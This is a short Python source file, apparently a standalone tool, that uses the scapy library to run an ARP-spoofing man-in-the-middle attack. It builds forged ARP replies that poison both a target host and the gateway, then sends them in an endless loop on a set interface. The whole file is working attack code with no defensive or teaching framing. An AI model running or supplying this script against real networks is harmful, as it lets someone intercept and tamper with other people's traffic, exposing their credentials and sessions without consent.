from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf


class MITM:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.mac = get_if_hwaddr(interface)
        self.broadcast = "ff:ff:ff:ff:ff:ff"

    def _create_arp_response(self, source_ip, target_ip, target_mac):
        return Ether(src=self.mac, dst=target_mac) / ARP(
            op=2, hwsrc=self.mac, hwdst=target_mac, psrc=source_ip, pdst=target_ip
        )

    def run_attack(self):
        arp_response_target = self._create_arp_response(
            self.gateway_ip, self.target_ip, self.broadcast
        )
        arp_response_gateway = self._create_arp_response(
            self.target_ip, self.gateway_ip, self.broadcast
        )

        print("MITM Running...")

        while True:
            sendp(arp_response_target, iface=self.interface)
            sendp(arp_response_gateway, iface=self.interface)


if __name__ == "__main__":
    mitm = MITM(target_ip="192.168.1.2", gateway_ip="192.168.1.1", interface="eth0")
    mitm.run_attack()
